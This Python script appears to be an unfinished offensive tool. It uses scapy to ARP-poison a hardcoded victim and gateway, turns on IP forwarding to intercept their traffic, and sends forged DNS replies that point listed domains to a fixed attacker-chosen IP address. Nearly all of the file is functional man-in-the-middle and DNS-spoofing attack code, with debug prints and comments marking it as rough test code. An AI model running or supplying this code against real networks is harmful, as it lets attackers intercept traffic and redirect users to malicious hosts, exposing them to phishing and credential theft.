from scapy.all import *
import time
import threading
from utils.network_utils import get_mac_address, get_local_mac
from utils.ip_forward import enable_ip_forwarding, disable_ip_forwarding
from utils import get_gateway_ip
import os
import socket
import argparse

domain = None
spoof_ip = "104.21.18.235"
sniff_filter = "udp dst port 53"
victim_ip = "10.0.123.5"
registers = {"example.com"}

#Dictionary with console color codes to print text
colors = {'HEADER' : "\033[95m",
    'OKBLUE' : "\033[94m",
    'RED' : "\033[91m",
    'OKYELLOW' : "\033[93m",
    'GREEN' : "\033[92m",
    'LIGHTBLUE' : "\033[96m",
    'WARNING' : "\033[93m",
    'FAIL' : "\033[91m",
    'ENDC' : "\033[0m",
    'BOLD' : "\033[1m",
    'UNDERLINE' : "\033[4m" }

def valid_ip(address):
    try: 
        socket.inet_aton(address)
        return True
    except:
        return False
    
def check_local_ip():
    local_ip = os.popen("ip route | grep 'src' | awk {'print $9'}").read().strip()
    while True:
        if(valid_ip(local_ip)): break
        else: local_ip = input(colors['WARNING']+"    [!] Cannot get your local IP addres, please write it: "+colors['ENDC']).strip()
    return local_ip

local_ip = check_local_ip()

def poison_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, interface):
    """
    Function to send ARP spoofing packets to the victim and the gateway.

    Parameters:
    victim_ip (str): IP address of the victim's machine.
    victim_mac (str): MAC address of the victim's machine.
    gateway_ip (str): IP address of the gateway.
    gateway_mac (str): MAC address of the gateway.
    attacker_mac (str): MAC address of the attacker's machine.
    interface (str): Network interface to use for sending ARP packets.

    Outputs:
    - Sends ARP spoofing packets to the victim and gateway.
    - Prints status messages indicating success or failure of the ARP poison.

    Alternative Outputs:
    - Prints an error message if packet sending fails.
    """
    try:
        victim_arp_response = ARP(op=2, psrc=gateway_ip, pdst=victim_ip, hwdst=victim_mac, hwsrc=attacker_mac)
        gateway_arp_response = ARP(op=2, psrc=victim_ip, pdst=gateway_ip, hwdst=gateway_mac, hwsrc=attacker_mac)
        send(victim_arp_response, iface=interface, verbose=False)
        print("ARP poison sent: [Victim IP: %s | Spoofed as Gateway IP: %s]" % (victim_ip, gateway_ip))
        send(gateway_arp_response, iface=interface, verbose=False)
        print("ARP poison sent: [Gateway IP: %s | Spoofed as Victim IP: %s]" % (gateway_ip, victim_ip))

        # TEST CODE
        print("Sniffing...")
        sniff(prn=fake_dns_response, filter=sniff_filter, store=0, iface="enp0s10")

        print("Do I enter here?")
    except Exception as e:
        print("Failed to send ARP poison: %s" % str(e))

def restore_network(victim_ip, victim_mac, gateway_ip, gateway_mac, interface):
    """
    Function to restore the ARP tables of the victim and the gateway to their correct state.

    Parameters:
    victim_ip (str): IP address of the victim's machine.
    victim_mac (str): MAC address of the victim's machine.
    gateway_ip (str): IP address of the gateway.
    gateway_mac (str): MAC address of the gateway.
    interface (str): Network interface to use for sending ARP packets.

    Outputs:
    - Sends ARP packets to restore the ARP tables of the victim and gateway.
    - Prints status messages indicating success or failure of the ARP table restoration.

    Alternative Outputs:
    - Prints an error message if packet sending fails.
    """
    try:
        send(ARP(op=2, psrc=gateway_ip, pdst=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5, iface=interface, verbose=False)
        send(ARP(op=2, psrc=victim_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=5, iface=interface, verbose=False)
        print("ARP tables restored for [Victim IP: %s, Gateway IP: %s]" % (victim_ip, gateway_ip))
    except Exception as e:
        print("Failed to restore network: %s" % str(e))

def run(args):
    """
    Function to run the ARP poisoning attack.
    
    Parameters:
    args (argparse.Namespace): Command-line arguments.
    
    Outputs:
    - Continuously sends ARP spoofing packets to the victim and the gateway.
    - Restores the ARP tables of the victim and the gateway when the attack is stopped.
    - Prints status messages indicating the start, stop, and success of the ARP poisoning.
    """
    if not args.victim_mac:
        args.victim_mac = get_mac_address(args.victim_ip, interface=args.interface)
        if not args.victim_mac:
            print("Failed to find MAC address for victim IP: {}".format(args.victim_ip))
            return

    if not args.gateway_mac:
        args.gateway_mac = get_mac_address(args.gateway_ip, interface=args.interface)
        if not args.gateway_mac:
            print("Failed to find MAC address for gateway IP: {}".format(args.gateway_ip))
            return

    if not args.attacker_mac:
        args.attacker_mac = get_local_mac(interface=args.interface)
        if not args.attacker_mac:
            print("Failed to find MAC address for attacker interface: {}".format(args.interface))
            return
    
    # ALL JANKY TEST CODE
    # NEEDS TO BE REFORMATTED
   
    enable_ip_forwarding()
    stop_event = threading.Event()
    arp_poison_thread = threading.Thread(target=arp_poison_loop, args=(args, stop_event))
    arp_poison_thread.start()

    # Start the dns spoof #TEST
    #start_spoof()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Stopping ARP poisoning and restoring network...")
        stop_event.set()
        arp_poison_thread.join()
        restore_network(args.victim_ip, args.victim_mac, args.gateway_ip, args.gateway_mac, args.interface)
        disable_ip_forwarding()

def arp_poison_loop(args, stop_event):
    while not stop_event.is_set():
        poison_arp(args.victim_ip, args.victim_mac, args.gateway_ip, args.gateway_mac, args.attacker_mac, args.interface)
        time.sleep(2)

def poison_gateway_router(args):
    """
    Function to poison the gateway router and the victim's ARP tables.

    Parameters:
    victim_ip (str): IP address of the victim's machine.
    victim_mac (str): MAC address of the victim's machine.
    attacker_mac (str): MAC address of the attacker's machine.
    interface (str): Network interface to use for sending ARP packets.

    Outputs:
    - Sends ARP spoofing packets to the victim and the gateway router.
    - Prints status messages indicating success or failure of the ARP poison.

    Alternative Outputs:
    - Prints an error message if packet sending fails.
    """
    try:
        global domain, spoof_ip
        domain = args.domain
        #spoof_ip = args.spoof_ip

        gateway_ip = get_gateway_ip.find_gateway_ip()
        gateway_mac = get_mac_address(gateway_ip)
        argsnew = argparse.Namespace()
        argsnew.victim_ip = args.victim_ip 
        argsnew.victim_mac = args.victim_mac
        argsnew.gateway_ip = gateway_ip
        argsnew.gateway_mac = gateway_mac  
        argsnew.attacker_mac = args.attacker_mac
        argsnew.interface = args.interface
        run(argsnew)
    except Exception as e:
        print("Failed to poison gateway router: %s" % str(e))

def check_victims(pkt):
    print("Received packet...")
    if(IP in pkt): 
        result = (pkt[IP].src == victim_ip)
        print("From victim...")
    else: 
        result = False
        print("Not from victim...")
    print("Result: ", result)
    return result  

def fake_dns_response(pkt):
    result = check_victims(pkt)
    print("Smthng: {}".format(str(pkt[DNSQR].qname)[0:len(str(pkt[DNSQR].qname))-1]))
    if (result and pkt[IP].src != local_ip and UDP in pkt and DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and str(pkt[DNSQR].qname)[0:len(str(pkt[DNSQR].qname))-1] in registers):
        cap_domain = str(pkt[DNSQR].qname)[2:len(str(pkt[DNSQR].qname))-2]
        fakeResponse = IP(dst=pkt[IP].src,src=pkt[IP].dst) / UDP(dport=pkt[UDP].sport,sport=53) / DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,qr=1, ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata=spoof_ip) / DNSRR(rrname=pkt[DNSQR].qname,rdata=spoof_ip))
        send(fakeResponse, verbose=0)
        print(colors['GREEN']+"    [#] Spoofed response sent to "+colors['ENDC']+"["+pkt[IP].src+"]"+colors['WARNING']+": Redirecting "+colors['ENDC']+"["+cap_domain+"]"+colors['WARNING']+" to "+colors['ENDC']+"["+spoof_ip+"]")

